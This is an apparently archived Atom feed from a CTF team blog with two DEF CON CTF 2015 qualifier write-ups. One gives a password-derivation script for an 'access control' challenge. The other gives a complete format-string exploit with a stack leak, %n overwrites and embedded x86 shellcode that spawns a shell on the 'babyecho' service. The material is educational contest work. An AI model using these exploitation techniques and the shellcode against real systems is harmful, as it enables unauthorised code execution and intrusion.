<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Defcon | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/defcon/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-05-20T00:44:41+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Access Control Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/"/>
    <updated>2015-05-19T00:52:48+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 Access-Control Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Reverse</strong></p>

<p>TL;DR</p>

<p>we are given a binary which seems to be a client to access a server.</p>

<!--more-->


<p>you can see my solution here:</p>

<pre><code>import socket 
import telnetlib


s = socket.create_connection(("access_control_server_f380fcad6e9b2cdb3c73c651824222dc.quals.shallweplayaga.me", 17069))

cid =  s.recv(1024).split(" ")[2]
#cid = "H\"Y1)3IY+yEl\\3\n"
print cid , len(cid)
s80 = ord(cid[7])
print chr(s80)
s80 = s80 % 3
#s80 = 0
dst = cid[s80+1:s80+1+5]
print dst
p = "duchess" #grumpy
passw = ""

for i in range(5):
    passw += chr(ord(p[i]) ^ ord(dst[i]))
passw = list(passw)
print passw
for i in range(5):
    if ord(passw[i]) &lt;= 0x1f:
        passw[i] = chr(ord(passw[i]) + ord(' '))
    if ord(passw[i]) == 0x7f:
        passw[i] = chr(ord(passw[i]) - 0x7E + 0x20)

passw = ''.join(passw)
print passw
print s.recv(1024)
#print s.recv(1024)
s.send("version 3.11.54\n")
print s.recv(1024)
s.send("duchess\n")
print s.recv(1024)
s.send(passw+"\n")
print s.recv(1024)

s.send("print key\n")
print s.recv(1024)
chall = s.recv(1024)
print chall
chall = chall.split(" ")[1]
print chall
#print s.recv(1024)

# compute answer on chall

dst = cid[s80+7:s80+7+5]
print dst
passw = ""

for i in range(5):
    passw += chr(ord(chall[i]) ^ ord(dst[i]))
passw = list(passw)
print passw
for i in range(5):
    if ord(passw[i]) &lt;= 0x1f:
        passw[i] = chr(ord(passw[i]) + ord(' '))
    if ord(passw[i]) == 0x7f:
        passw[i] = chr(ord(passw[i]) - 0x7E + 0x20)

passw = ''.join(passw)
print passw, len(passw)

s.send(passw+"\n")




t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>Running the script:</p>

<pre><code>$ python access-sol.py
XZI_}jT.'l@Km+
[..]

the key is: The only easy day was yesterday. 44564

hello duchess, what would you like to do?
</code></pre>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/"/>
    <updated>2015-05-18T21:45:44+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup</id>
    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
<strong>Point = 1</strong><br/>
<strong>Category = Pwnable</strong></p>

<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>

<pre><code>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
</code></pre>

<p>First try got my attention:</p>

<pre><code>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
Reading 13 bytes
</code></pre>

<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>

<!--more-->


<p>but there&rsquo;s a limit, 13 bytes? right?</p>

<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
some resolving symbols the function looks like this:</p>

<pre><code>int sub_8048F3C()
{
  signed int v0; // eax@2
  int v3; // [sp+10h] [bp-410h]@1
  int v4; // [sp+1Ch] [bp-404h]@4
  int v5; // [sp+41Ch] [bp-4h]@1

  v5 = *MK_FP(__GS__, 20);
  v3 = 13;
  setvbuf((int)off_80EA4C0, 0, 2, 0);
  signal(14, (int)sub_8048EB1);
  alarm(10);
  while ( 1 )
  {
    v0 = 1023;
    if ( v3 &lt;= 1023 )
      v0 = v3;
    v3 = v0;
    printf("Reading %d bytes\n", v0);
    reado((int)&amp;v4, v3, 10);
    filter_n((int)&amp;v4);
    printf((const char *)&amp;v4);
    alarm(10);
  }
}
</code></pre>

<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>

<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>

<p>i just need to know the offset, and gdb says it is 7:</p>

<pre><code>Reading 13 bytes
%p%p%p%p
[-------------------------------------registers--------------------------------------]
EAX: 0xffffc86c ("%p%p%p%p")
EBX: 0x80481a8 (push   ebx)
ECX: 0x0 
EDX: 0xffffffff 
ESI: 0x0 
EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
EIP: 0x804900f (call   0x804f560)
[----------------------------------------code----------------------------------------]
   0x8049003:   call   0x8048ecf
   0x8049008:   lea    eax,[esp+0x1c]
   0x804900c:   mov    DWORD PTR [esp],eax
=&gt; 0x804900f:   call   0x804f560
   0x8049014:   mov    DWORD PTR [esp],0xa
   0x804901b:   call   0x804fde0
   0x8049020:   mov    DWORD PTR [esp],0x14
   0x8049027:   call   0x806cb50
Guessed arguments:
arg[0]: 0xffffc86c ("%p%p%p%p")
[---------------------------------------stack----------------------------------------]
00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
01:0004|     0xffffc854 --&gt; 0xd (b'\r')
02:0008|     0xffffc858 --&gt; 0xa (b'\n')
03:0012|     0xffffc85c --&gt; 0x0 
04:0016|     0xffffc860 --&gt; 0xd (b'\r')
05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
06:0024|     0xffffc868 --&gt; 0x0 
07:0028| eax 0xffffc86c ("%p%p%p%p")
[------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value

Breakpoint 2, 0x0804900f in ?? ()
</code></pre>

<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>

<p>TL;DR
Please check my implementation:</p>

<pre><code>#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('&lt;I', v)

def u(v):
    return struct.unpack('&lt;I', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger


shellcode = (
"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
        )

readuntil(f)
f.write("%p"*5+"\n")
loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c

readuntil(f)
f.write(p(loc)+"%30u%7$n\n")



readuntil(f)
f.write(p(loc)+"%1200u%7$n\n")

readuntil(f)

wrl = loc+100 &amp; 0xffff
wrh = (loc+100 &gt;&gt; 16 ) &amp; 0xffff

print hex(wrl), hex(wrh)

payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
print payload


f.write(payload)

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>there you go:</p>

<pre><code>$ python babyecho-expl.py
0x4a24 0xffd2
�I��%018980c%0007$hn%046502c
[...]
cat /home/babyecho/flag 
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
</code></pre>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
